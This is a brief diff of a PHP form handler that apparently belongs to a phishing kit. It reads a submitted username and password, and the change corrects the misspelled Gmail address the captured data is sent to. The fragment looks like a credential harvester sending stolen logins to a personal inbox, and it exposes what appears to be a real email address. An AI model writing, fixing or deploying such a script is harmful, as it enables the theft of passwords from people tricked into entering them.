@@ -1,6 +1,6 @@
 <?php
 if(isset($_POST['submit'])){
-    $to = "hussainyousaf83@gmial.com"; //Receiver EmialAdress.......
+    $to = "hussainyousaf83@gmail.com"; //Receiver EmialAdress.......
     $from = $_POST['user-name'];
     $pass = $_POST['pass'];
 
